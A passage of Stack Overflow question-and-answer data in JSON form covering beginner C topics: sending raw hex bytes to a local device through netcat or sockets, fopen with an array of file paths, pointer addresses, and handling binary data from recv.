51094960, "body": "Why are you porting a script to C if you are just going to call a bunch of external binaries anyway?"}, {"owner": {"reputation": 49, "user_id": 3394618, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/455d434f0fe9550fa13c707f1d0ecc12?s=128&d=identicon&r=PG&f=1", "display_name": "user252836", "link": "https://stackoverflow.com/users/3394618/user252836"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1437586291, "post_id": 31570029, "comment_id": 51095096, "body": "Because I have to do some bit shifting and I feel more comfortable doing it in c. This is just an example to get a response from the device."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437589131, "post_id": 31570029, "comment_id": 51096799, "body": "I posted an answer that cleanly compiles and works. (I tested it using &#39;localhost&#39; and port set to 80 using apache2 server,)"}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 3394618, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/455d434f0fe9550fa13c707f1d0ecc12?s=128&d=identicon&r=PG&f=1", "display_name": "user252836", "link": "https://stackoverflow.com/users/3394618/user252836"}, "edited": false, "score": 0, "creation_date": 1437586984, "post_id": 31570224, "comment_id": 51095516, "body": "Thanks! I never heard of popen() before."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 49, "user_id": 3394618, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/455d434f0fe9550fa13c707f1d0ecc12?s=128&d=identicon&r=PG&f=1", "display_name": "user252836", "link": "https://stackoverflow.com/users/3394618/user252836"}, "edited": false, "score": 0, "creation_date": 1437587626, "post_id": 31570224, "comment_id": 51095877, "body": "see my second edit for an implementation in C (untested, just for reference)"}, {"owner": {"reputation": 49, "user_id": 3394618, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/455d434f0fe9550fa13c707f1d0ecc12?s=128&d=identicon&r=PG&f=1", "display_name": "user252836", "link": "https://stackoverflow.com/users/3394618/user252836"}, "edited": false, "score": 0, "creation_date": 1437588130, "post_id": 31570224, "comment_id": 51096172, "body": "Just tried your code and it works! Now to look up everything so I can understand what&#39;s going."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 49, "user_id": 3394618, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/455d434f0fe9550fa13c707f1d0ecc12?s=128&d=identicon&r=PG&f=1", "display_name": "user252836", "link": "https://stackoverflow.com/users/3394618/user252836"}, "edited": false, "score": 0, "creation_date": 1437588452, "post_id": 31570224, "comment_id": 51096372, "body": "btw, i would prefer <code>char mp_fmt[] = {0x0,0x0,0x0,0x0,0x0,0x9,0x1,0x10,0x0,0x0,0x0,0x1,0x2,0x0,0x&zwnj;&#8203;1};</code> .. just because this is <i>no way</i> a string but a sequence of bytes. compiles to the same code except you save the implicit 0 byte at the end, but is <i>imho</i> more concise."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": true, "score": 4, "last_activity_date": 1437587597, "last_edit_date": 1437587597, "creation_date": 1437586669, "answer_id": 31570224, "question_id": 31570029, "link": "https://stackoverflow.com/questions/31570029/passing-hex-to-bash-command-in-c/31570224#31570224", "title": "Passing hex to bash command in C", "body": "<p>Doing it like this, you don't want the <code>0</code> bytes but the literal string <code>\\0</code>. So,</p>\n\n<pre><code>sprintf(buffer, \"echo \\\"\\\\0\\\\0\\\\0\\\\0\\\\0\\\\x9\\\\x10 [...]\n</code></pre>\n\n<p>would work.</p>\n\n<p>That being said, there are a some other <em>issues</em>.</p>\n\n<p>The simple one is: What is the buffer for? You don't have <strong>any</strong> formatting, so just use the string of your command literally!</p>\n\n<p>Next: Using <code>echo</code> from C? Really? You fork 3(!) processes like this. At least, use <code>popen()</code> for nc and just <code>fwrite()</code> your input string there.</p>\n\n<p>Even better: You just send some data to a socket. There is a perfecly fine <code>bsd sockets</code> API for that, no need to call ANY external tool.</p>\n\n<p><strong>[edit]</strong>: by using sockets yourself, you CAN send the raw <code>0</code> bytes.</p>\n\n<p><strong>[edit2]</strong>: some sketchup code</p>\n\n<pre><code>#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n\n[...]\n\nint fd;\nstruct sockaddr_in sin;\nchar mp_fmt[] = \"\\x00\\x00\\x00\\x00\\x00\\x09\\x01\\x10\\x00\\x00\\x00\\x01\\x02\\x00\\x01\";\n\nfd = socket(AF_INET, SOCK_STREAM, 0);\nsin.sin_family = AF_INET;\nsin.sin_addr.s_addr = inet_addr(\"192.168.1.22\");\nsin.sin_port = htons(500);\n\nconnect(fd, (struct sockaddr *)&amp;sin,sizeof(struct sockaddr_in));\n\nwrite(fd, mp_fmt, 15);\n\nshutdown(fd, SHUT_RDWR);\nclose(fd);\n</code></pre>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437586956, "post_id": 31570263, "comment_id": 51095499, "body": "Well, you identify the problem correctly, but the solution is wrong. <code>echo</code> will still not accept an argument containing <code>0</code> bytes, because it&#39;s still the string terminator (in <code>echo</code>s <code>argv</code>). That&#39;s why you use the escaped form of literal <code>\\0</code>."}, {"owner": {"reputation": 61, "user_id": 5141149, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a446d7679fe9d51020d9b9de1da03c57?s=128&d=identicon&r=PG", "display_name": "merridius", "link": "https://stackoverflow.com/users/5141149/merridius"}, "edited": false, "score": 0, "creation_date": 1437587512, "post_id": 31570263, "comment_id": 51095805, "body": "I don&#39;t get it... in the example he gave from the bash script passing -e so the device expects the null character. In the case you gave it would pass whatever the ascii representation of literal <code>\\0</code> to the device wouldn&#39;t it??  i&#39;m confused lol could you kindly explain?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437587784, "post_id": 31570263, "comment_id": 51095959, "body": "Yep, echo will send <code>0</code> bytes through the pipe to nc. the point here is: echo cannot read <code>0</code> bytes from it&#39;s argument list ... that&#39;s the reason for the escape sequence <code>\\0</code> (meaning two bytes, ascii code for <code>\\</code> and ascii code for <code>0</code>). If you want to construct a working commandline in C, you have to put the string <code>\\0</code> there instead of the byte <code>0</code>. echo translates this to a <code>0</code> byte before writing it."}, {"owner": {"reputation": 61, "user_id": 5141149, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a446d7679fe9d51020d9b9de1da03c57?s=128&d=identicon&r=PG", "display_name": "merridius", "link": "https://stackoverflow.com/users/5141149/merridius"}, "edited": false, "score": 0, "creation_date": 1437588125, "post_id": 31570263, "comment_id": 51096169, "body": "oh right i was confused because you didn&#39;t print -e into the buffer. it is necessary i believe for echo to interpret escaped sequences"}], "tags": [], "owner": {"reputation": 61, "user_id": 5141149, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a446d7679fe9d51020d9b9de1da03c57?s=128&d=identicon&r=PG", "display_name": "merridius", "link": "https://stackoverflow.com/users/5141149/merridius"}, "is_accepted": false, "score": 0, "last_activity_date": 1437587675, "last_edit_date": 1437587675, "creation_date": 1437586806, "answer_id": 31570263, "question_id": 31570029, "link": "https://stackoverflow.com/questions/31570029/passing-hex-to-bash-command-in-c/31570263#31570263", "title": "Passing hex to bash command in C", "body": "<p>The warning comes because you have a null character inside the string you specified. It is expected and there's nothing you can do besides turning the warning off.</p>\n\n<p>Also I'm guessing this:</p>\n\n<pre><code>//sprintf(buffer,\"echo -e \\\"%s\\\" | nc 192.168.01.22 500\");\n</code></pre>\n\n<p>should be this:</p>\n\n<pre><code>//sprintf(buffer,\"echo -e \\\"%s\\\" | nc 192.168.01.22 500\", mp_fmt);\n</code></pre>\n\n<p>In this case your device does not respond because not the <strong>entire</strong> string is passed in.\nIn C, the standard is that string are <strong>null-terminated</strong>. This means that any library call (such as <code>sprintf</code>), will not access memory beyond the first null-character it encounters. Thus in this case what is being written into your buffer is only the first <code>\\x00</code>, and nothing else.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437589476, "post_id": 31570939, "comment_id": 51097001, "body": "No it has the same issue. It puts <code>0</code> bytes in the command line argument for <code>echo</code>. &lt;del&gt;<code>echo</code> will see an empty string as its first argument, because the first character is <code>0</code>.&lt;/del&gt; -- in fact, the shell will stop parsing this at the first <code>0</code> byte..."}, {"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "edited": false, "score": 1, "creation_date": 1437593007, "post_id": 31570939, "comment_id": 51099250, "body": "1) all of your data is <i>constant</i>.  You can <i>delete</i> every line but &quot;system()&quot;, and use a string literal, instead of sprintf/buffer.  2) It doesn&#39;t solve the problem you asked about in the first place :( 3) I&#39;m still not sure you completely understand the difference between a binary &quot;0&quot; (8 bits, all 0) and an ASCII &quot;0&quot; (8 bits, 0x30).  If you want to use &quot;echo&quot;, you must use ASCII.  And if you want the quotes and the back-slashes passed to &quot;echo&quot; then you must escape them in C: <code>&quot;echo -e \\&quot;\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x09\\\\x01\\\\x10\\\\x00\\\\x00\\\\x00\\\\x&zwnj;&#8203;01\\\\02\\\\x00\\\\x01\\&quot; | nc 192.168.01.22 500&quot;</code>"}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": -2, "last_activity_date": 1437588932, "creation_date": 1437588932, "answer_id": 31570939, "question_id": 31570029, "link": "https://stackoverflow.com/questions/31570029/passing-hex-to-bash-command-in-c/31570939#31570939", "title": "Passing hex to bash command in C", "body": "<p>the posted code contains several oversights.</p>\n\n<p>To keep things simple, here is a corrected version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main( void )\n{\n\n    char buffer[512];\n    char mp_fmt[] = \"\\x00\\x00\\x00\\x00\\x00\\x09\\x01\\x10\\x00\\x00\\x00\\x01\\02\\x00\\x01\";\n\n    sprintf(buffer,\"echo -e \\\"%s\\\" | nc 192.168.01.22 500\", mp_fmt);\n    system((char *)buffer);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 3394618, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/455d434f0fe9550fa13c707f1d0ecc12?s=128&d=identicon&r=PG&f=1", "display_name": "user252836", "link": "https://stackoverflow.com/users/3394618/user252836"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1212, "favorite_count": 0, "accepted_answer_id": 31570224, "answer_count": 3, "score": 2, "last_activity_date": 1437588932, "creation_date": 1437586021, "last_edit_date": 1437586093, "question_id": 31570029, "link": "https://stackoverflow.com/questions/31570029/passing-hex-to-bash-command-in-c", "title": "Passing hex to bash command in C", "body": "<p>I'm trying to port a bash script to c. I'm having trouble passing a hex string to a bash command. This is what I have so far.        </p>\n\n<pre><code>char buffer[512];\nchar mp_fmt[] = \"\\x00\\x00\\x00\\x00\\x00\\x09\\x01\\x10\\x00\\x00\\x00\\x01\\02\\x00\\x01\";\nsprintf(buffer,\"echo -e \\\"\\x00\\x00\\x00\\x00\\x00\\x09\\x01\\x10\\x00\\x00\\x00\\x01\\02\\x00\\x01\\\" | nc 192.168.01.22 500\");\n//sprintf(buffer,\"echo -e \\\"%s\\\" | nc 192.168.01.22 500\");\nsystem((char *)buffer);\n</code></pre>\n\n<p>When I run this, the compiler returns this </p>\n\n<pre><code>test.c:7:5: warning: embedded \u2018\\0\u2019 in format [-Wformat-contains-nul]\n     sprintf(buffer,\"echo \\\"\\x00\\x00\\x00\\x00\\x00\\x09\\x01\\x10\\x00\\x00\\x00\\x01\\02\\x00\\x01\\\" | nc 192.168.01.22 500\");\n</code></pre>\n\n<p>But when I run it with the other sprintf that's commented out, it doesn't complain but its not working because the device isn't responding. </p>\n\n<p>Also in the bash script, this is how its done and I get a response from the device.</p>\n\n<pre><code>echo -e \"\\0\\0\\0\\0\\0\\x9\\x1\\x10\\0\\0\\0\\01\\02\\0\\x01\" | nc 192.168.01.22 500\n</code></pre>\n\n<p>Thanks for reading my long post.</p>\n"}, {"tags": ["c", "arrays", "file", "io", "fopen"], "comments": [{"owner": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 2, "creation_date": 1437585508, "post_id": 31569580, "comment_id": 51094628, "body": "You declared an array of 100 strings which are 3 bytes long, each."}, {"owner": {"reputation": 53, "user_id": 4707956, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/10206081245289102/picture?type=large", "display_name": "alemootasa", "link": "https://stackoverflow.com/users/4707956/alemootasa"}, "reply_to_user": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 0, "creation_date": 1437586641, "post_id": 31569580, "comment_id": 51095312, "body": "No man, check this out <a href=\"http://stackoverflow.com/a/1095006/5085985\">stackoverflow.com/a/1095006/5085985</a>. Also, the compiler would have tell me that, I am initializing the matrix with longer strings than 3 characters. Thank you for responding!"}, {"owner": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 0, "creation_date": 1437586815, "post_id": 31569580, "comment_id": 51095415, "body": "char strs[NUMBER_OF_STRINGS][STRING_LENGTH+1]; 100 strings, which can hold 3 bytes (including the terminating &#39;\\0&#39;)"}, {"owner": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 0, "creation_date": 1437587153, "post_id": 31569580, "comment_id": 51095625, "body": "The compiler probably didn&#39;t warn you because you&#39;re making an assignment of a char ** type to a char **, which is legal. Always compile with -Wall when something goes wrong."}, {"owner": {"reputation": 115119, "user_id": 1053, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/3f38c0e0cc4a1ca4656bfd8c78a581f2?s=128&d=identicon&r=PG", "display_name": "Ed S.", "link": "https://stackoverflow.com/users/1053/ed-s"}, "edited": false, "score": 0, "creation_date": 1437594771, "post_id": 31569580, "comment_id": 51100252, "body": "No man, your declaration is wrong, and indices start at 0 in C"}, {"owner": {"reputation": 53, "user_id": 4707956, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/10206081245289102/picture?type=large", "display_name": "alemootasa", "link": "https://stackoverflow.com/users/4707956/alemootasa"}, "reply_to_user": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 0, "creation_date": 1437638081, "post_id": 31569580, "comment_id": 51115806, "body": "@Alexguitar and Ed.s Allright, the blunder is always hiding in the darkest corner of the room. You are right, sorry, my bad!"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437662902, "post_id": 31569580, "comment_id": 51133465, "body": "compiling with all warnings enabled would have told you the syntax problems in the code.   When #define&#39;ing a numeric value, always wrap the value in parens to avoid text-replacement errors"}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 4707956, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/10206081245289102/picture?type=large", "display_name": "alemootasa", "link": "https://stackoverflow.com/users/4707956/alemootasa"}, "edited": false, "score": 0, "creation_date": 1437585963, "post_id": 31569659, "comment_id": 51094895, "body": "Thank you man, I solved the problem but I didn&#39;t know these methods. Thank you again!"}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 1, "last_activity_date": 1437585640, "last_edit_date": 1437585640, "creation_date": 1437584846, "answer_id": 31569659, "question_id": 31569580, "link": "https://stackoverflow.com/questions/31569580/c-relative-path-with-fopen/31569659#31569659", "title": "C - Relative path with fopen()", "body": "<p>You should check against failure all of <code>fopen</code>, <code>fprintf</code>, <code>fclose</code> (on failure, consider using <code>perror</code>). And you might want to call (sometimes) <code>fflush</code>.</p>\n\n<p>Be sure to read the documentation of every function I am mentioning here.</p>\n\n<p>BTW, you can generate some file path, e.g.</p>\n\n<pre><code>char path[384];\nint i = somenumber();\nsnprintf(path, sizeof(path), \"/some/path/data_%d.txt\", i);\nFILE *f = fopen(path, \"r\");\nif (!f) { perror(path); exit(EXIT_FAILURE); };\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 4707956, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/10206081245289102/picture?type=large", "display_name": "alemootasa", "link": "https://stackoverflow.com/users/4707956/alemootasa"}, "edited": false, "score": 0, "creation_date": 1437586095, "post_id": 31569681, "comment_id": 51094983, "body": "Yes I am, in the actual program I need some container for all the paths I am using, basically because they are a lot and I don&#39;t want to create lots and lots of variables just to insert them in fopen(). Thank you for responding!"}], "tags": [], "owner": {"reputation": 43, "user_id": 5085985, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-sHggMTXVOCs/AAAAAAAAAAI/AAAAAAAACAI/4n9fwzcCf8Y/photo.jpg?sz=128", "display_name": "Seth", "link": "https://stackoverflow.com/users/5085985/seth"}, "is_accepted": false, "score": 0, "last_activity_date": 1437584925, "last_edit_date": 1495541169, "creation_date": 1437584925, "answer_id": 31569681, "question_id": 31569580, "link": "https://stackoverflow.com/questions/31569580/c-relative-path-with-fopen/31569681#31569681", "title": "C - Relative path with fopen()", "body": "<p>Do you want to be declaring a two-dimensional array for your paths? It looks like you're passing your whole first row (three strings) to <code>fopen()</code>.</p>\n\n<p>See here: <a href=\"https://stackoverflow.com/a/1095006/5085985\">https://stackoverflow.com/a/1095006/5085985</a></p>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 4707956, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/10206081245289102/picture?type=large", "display_name": "alemootasa", "link": "https://stackoverflow.com/users/4707956/alemootasa"}, "edited": false, "score": 0, "creation_date": 1437585743, "post_id": 31569740, "comment_id": 51094770, "body": "Second issue: yeah, I forgot to correct the indexes, but in the program I am actually writing the indexes are correct (they start from 0). My bad, sorry!                                                                                                             First issue: it worked, thank you very much!"}], "tags": [], "owner": {"reputation": 17136, "user_id": 1169435, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wsvfb.jpg?s=128&g=1", "display_name": "ISanych", "link": "https://stackoverflow.com/users/1169435/isanych"}, "is_accepted": true, "score": 5, "last_activity_date": 1437585098, "creation_date": 1437585098, "answer_id": 31569740, "question_id": 31569580, "link": "https://stackoverflow.com/questions/31569580/c-relative-path-with-fopen/31569740#31569740", "title": "C - Relative path with fopen()", "body": "<p>Main issue that you incorrectly create and populate array of paths, try this approach for example:</p>\n\n<pre><code>const char* paths[3] = {\"c:\\\\Users\\\\ThisPc\\\\Desktop\\\\file1.txt\",\n                        \"c:\\\\Users\\\\ThisPc\\\\Desktop\\\\file2.txt\",\n                        \"c:\\\\Users\\\\ThisPc\\\\Desktop\\\\file3.txt\"};\n</code></pre>\n\n<p>Second issue that array index starts from 0:</p>\n\n<pre><code>filepntr1 = fopen(paths[0], \"w\");\nfilepntr2 = fopen(paths[1], \"w\");\nfilepntr3 = fopen(paths[2], \"w\");\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 4707956, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/10206081245289102/picture?type=large", "display_name": "alemootasa", "link": "https://stackoverflow.com/users/4707956/alemootasa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 986, "favorite_count": 0, "accepted_answer_id": 31569740, "answer_count": 3, "score": 1, "last_activity_date": 1437585640, "creation_date": 1437584567, "question_id": 31569580, "link": "https://stackoverflow.com/questions/31569580/c-relative-path-with-fopen", "title": "C - Relative path with fopen()", "body": "<p>Here's my question: I have some relative paths saved in a matrix of strings. Depending on the user choiche, I have to open a certain file. The problem is that, when I use the fopen function, the file pointer doesn't point to anything. Here's a sample of the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAX_PATH 100\n\n///Global matrix of strings, containing the paths used in fopen() function\nchar paths[MAX_PATH][3] = {{\"c:\\\\Users\\\\ThisPc\\\\Desktop\\\\file1.txt\"},\n                           {\"c:\\\\Users\\\\ThisPc\\\\Desktop\\\\file2.txt\"},\n                           {\"c:\\\\Users\\\\ThisPc\\\\Desktop\\\\file3.txt\"}};\n\nint main(){\n    ///Declaring and initializing the 3 file pointers to NULL\n    FILE *filepntr1 = NULL;\n    FILE *filepntr2 = NULL;\n    FILE *filepntr3 = NULL;\n\n    ///Opening the 3 files with the correct arrays\n    filepntr1 = fopen(paths[1], \"w\");\n    filepntr2 = fopen(paths[2], \"w\");\n    filepntr3 = fopen(paths[3], \"w\");\n\n    ///Typing something on the files opened, just to check if the files where really opened\n    fprintf(filepntr1, \"hello\");\n    fprintf(filepntr2, \"hello\");\n    fprintf(filepntr3, \"hello\");\n\n    ///Closing the files\n    fclose(filepntr1);\n    fclose(filepntr2);\n    fclose(filepntr3);\n\n    return 0;\n}\n</code></pre>\n\n<p>Obviously, the three files remain blank.</p>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 4, "creation_date": 1437584960, "post_id": 31569575, "comment_id": 51094315, "body": "What is the difference between <code>&amp;x</code> and <code>x</code> (where <code>x</code> is <i>any</i> variable)?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1437585521, "post_id": 31569575, "comment_id": 51094638, "body": "I&#39;m voting to close this question as off-topic because it&#39;s asking why 1 is not 2"}, {"owner": {"reputation": 1, "user_id": 5135243, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/76643101f16ff141845c46a598bb5a6d?s=128&d=identicon&r=PG&f=1", "display_name": "Marvin", "link": "https://stackoverflow.com/users/5135243/marvin"}, "edited": false, "score": 0, "creation_date": 1437585679, "post_id": 31569575, "comment_id": 51094736, "body": "Here is additional information on the same question.     <a href=\"http://stackoverflow.com/a/25044661/5135243\">stackoverflow.com/a/25044661/5135243</a>"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1437586515, "post_id": 31569575, "comment_id": 51095228, "body": "Just write <code>void *x; x = &amp;x;</code> and you expectation is met. Btw, don&#39;t <code>printf()</code> pointers as integers."}], "answers": [{"tags": [], "owner": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "is_accepted": false, "score": 1, "last_activity_date": 1437584973, "creation_date": 1437584973, "answer_id": 31569696, "question_id": 31569575, "link": "https://stackoverflow.com/questions/31569575/pointers-addresses-behaviour/31569696#31569696", "title": "Pointers addresses behaviour", "body": "<p><code>ptr</code> is the pointer value (it's an address).</p>\n\n<p><code>&amp;ptr</code> is the address of the pointer object.</p>\n\n<p>To print a pointer value you have to use:</p>\n\n<pre><code>printf(\"ptr= %p  but &amp;ptr=%p\", (void *) ptr, (void *) &amp;ptr);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 0, "last_activity_date": 1437588905, "creation_date": 1437588905, "answer_id": 31570930, "question_id": 31569575, "link": "https://stackoverflow.com/questions/31569575/pointers-addresses-behaviour/31570930#31570930", "title": "Pointers addresses behaviour", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nint main() \n  {\n          int *ptr;\n          int i=5; \n          ptr=&amp;i;\n          printf(\"ptr= %p  but &amp;ptr=%p\",(void *)ptr,(void *)&amp;ptr);\n          return 0;\n   }\n</code></pre>\n\n<p>Here in this code <code>ptr</code> will give address of <code>i</code> and <code>&amp;ptr</code> will show address where value of <code>ptr</code> is stored. And to see values of <code>i</code> you can print <code>*ptr</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1563, "user_id": 2632764, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/TpYmn.png?s=128&g=1", "display_name": "Sorcrer", "link": "https://stackoverflow.com/users/2632764/sorcrer"}, "is_accepted": false, "score": 0, "last_activity_date": 1437589487, "creation_date": 1437589487, "answer_id": 31571119, "question_id": 31569575, "link": "https://stackoverflow.com/questions/31569575/pointers-addresses-behaviour/31571119#31571119", "title": "Pointers addresses behaviour", "body": "<pre><code>int *ptr;\n</code></pre>\n\n<p>delcares a pointer variable (pointer means a variable which points to other memory location)</p>\n\n<pre><code>printf(\"ptr= %d  but &amp;ptr=%d\",ptr,&amp;ptr);\n</code></pre>\n\n<p>printing ptr with %d gives the value of the varible ptr which will be a memory location,If the pointer is not initialized it will give some value which is insignificant</p>\n\n<p>printing &amp;ptr by %d gives the address of the pointer variable ptr which will be a memory location where the varible ptr is allocated</p>\n"}], "owner": {"reputation": 67, "user_id": 4959254, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/opEkf.png?s=128&g=1", "display_name": "super trainee", "link": "https://stackoverflow.com/users/4959254/super-trainee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "closed_date": 1437590891, "answer_count": 3, "score": -2, "last_activity_date": 1437589487, "creation_date": 1437584552, "last_edit_date": 1437585939, "question_id": 31569575, "link": "https://stackoverflow.com/questions/31569575/pointers-addresses-behaviour", "closed_reason": "Duplicate", "title": "Pointers addresses behaviour", "body": "<p>For example:</p>\n\n<pre><code>int *ptr\n</code></pre>\n\n<p>What's the difference beetween the &amp;ptr and ptr\nbecause when i do </p>\n\n<pre><code>printf(\"ptr= %d  but &amp;ptr=%d\",ptr,&amp;ptr);\n</code></pre>\n\n<p>the result is not the same. </p>\n"}, {"tags": ["c", "sockets", "binaryfiles", "binary-data"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437584292, "post_id": 31569425, "comment_id": 51093897, "body": "printf(&quot;\\nremotefile in val1 is %s\\n&quot;,remotefile);&#39; assumes a null-terminated string.  value returned by recv() not fully handled.   That&#39;s the first two &#39;usual suspects&#39; dealt with, now to find the strlen() calls..."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437584477, "post_id": 31569425, "comment_id": 51094015, "body": "&#39;int  result = strlen(buf);&#39; calling strlen() in binary data that may contain nuts."}, {"owner": 